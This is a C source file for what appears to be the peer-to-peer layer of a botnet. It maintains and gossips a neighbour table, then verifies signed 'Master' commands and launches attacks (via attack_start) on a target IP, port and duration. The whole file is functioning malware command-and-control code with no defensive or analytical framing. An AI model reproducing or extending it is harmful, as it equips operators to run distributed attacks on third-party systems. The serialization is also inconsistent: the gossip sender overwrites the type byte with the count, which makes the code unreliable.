#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>

#include "p2p.h"
#include "verify.h"
#include "attack.h"
#include "proxy.h"

static Neighbor table[MAX_NEIGHBORS];
static int neighbor_count = 0;

int p2p_init(void) {
    // Zero out table
    memset(table, 0, sizeof(table));

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(P2P_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[P2P] Bind failed");
        close(sock);
        return -1;
    }
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    return sock;
}

void p2p_add_neighbor(uint32_t ip, uint16_t port) {
    if (ip == 0 || port == 0) return;

    // 1. Check if exists
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (table[i].is_active && table[i].ip == ip && table[i].port == port) {
            table[i].last_seen = time(NULL);
            return;
        }
    }

    // 2. Find empty slot
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (!table[i].is_active) {
            table[i].ip = ip;
            table[i].port = port;
            table[i].last_seen = time(NULL);
            table[i].is_active = true;
            if (i >= neighbor_count) neighbor_count = i + 1;
            // printf("[P2P] New Neighbor Added: %08x\n", ip);
            return;
        }
    }

    // 3. Table full? Evict Random/Oldest (Simplified: Random)
    int evict_idx = rand() % MAX_NEIGHBORS;
    table[evict_idx].ip = ip;
    table[evict_idx].port = port;
    table[evict_idx].last_seen = time(NULL);
    table[evict_idx].is_active = true;
}

void p2p_handle_packet(int sock) {
    uint8_t buffer[1024];
    struct sockaddr_in src_addr;
    socklen_t addr_len = sizeof(src_addr);

    ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&src_addr, &addr_len);
    if (len < 0) return;

    if (len < 5) return; // Magic (4) + Count (1)

    // Check Magic
    // Check Magic
    uint32_t magic = *(uint32_t*)buffer;
    if (magic != htonl(P2P_MAGIC)) return; 

    // Packet Type
    uint8_t type = buffer[4];

    if (type == P2P_TYPE_GOSSIP) {
        // ... (Existing Gossip Logic) ...
        uint8_t count = buffer[5];
        int offset = 6;
        for (int i = 0; i < count; i++) {
            if (offset + 6 > len) break;
            uint32_t ip; uint16_t port;
            memcpy(&ip, buffer + offset, 4);
            memcpy(&port, buffer + offset + 4, 2);
            p2p_add_neighbor(ip, port);
            offset += 6;
        }
    } 
    else if (type == P2P_TYPE_CMD) {
        // [Magic(4)] [Type(1)] [Nonce(4)] [Sig(64)] [Len(2)] [Payload...]
        if (len < 5 + 4 + 64 + 2) return;

        int offset = 5;
        uint32_t nonce = *(uint32_t*)(buffer + offset); offset += 4;
        uint8_t *sig = buffer + offset; offset += 64;
        uint16_t payload_len = *(uint16_t*)(buffer + offset); offset += 2; // Should use ntohs in prod

        if (offset + payload_len > len) return;
        uint8_t *payload = buffer + offset;

        // Verify Signature
        if (ed25519_verify(payload, payload_len, sig)) {
            // Valid Command from Master!
            // Payload Format: [AttackType(1)] [IP(4)] [Port(2)] [Duration(4)]
            if (payload_len >= 11) {
                uint8_t atk_type = payload[0];
                uint32_t target_ip;
                uint16_t target_port;
                uint32_t duration;

                memcpy(&target_ip, payload + 1, 4);
                memcpy(&target_port, payload + 5, 2);
                memcpy(&duration, payload + 7, 4);

                // Execute Attack
                attack_start(atk_type, target_ip, ntohs(target_port), ntohl(duration));
                
                // Broadcast to Subscribers
                proxy_broadcast(payload, payload_len);
                
                // Propagate (Flood) - Send to all active neighbors
                // Simple logic: If nonce > last_nonce seen? (Skip for now to avoid storm)
            }
        }
    }
}

void p2p_gossip(int sock) {
    if (neighbor_count == 0) return;

    // Serialize Table
    uint8_t buffer[1024];
    uint32_t magic = htonl(P2P_MAGIC);
    memcpy(buffer, &magic, 4);
    buffer[4] = P2P_TYPE_GOSSIP; // Type
    
    // We can fit approx (1024 - 5) / 6 = ~169 entries.
    // Our max is 32. So send all active.
    
    int active_count = 0;
    int offset = 5;
    
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (table[i].is_active) {
            memcpy(buffer + offset, &table[i].ip, 4);
            memcpy(buffer + offset + 4, &table[i].port, 2);
            offset += 6;
            active_count++;
        }
    }
    buffer[4] = (uint8_t)active_count;

    // Send to random subset (fan-out 3)
    for (int i = 0; i < 3; i++) {
        int idx = rand() % MAX_NEIGHBORS;
        if (table[idx].is_active) {
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_addr.s_addr = table[idx].ip;
            dest.sin_port = table[idx].port;
            
            sendto(sock, buffer, offset, 0, (struct sockaddr *)&dest, sizeof(dest));
        }
    }
}
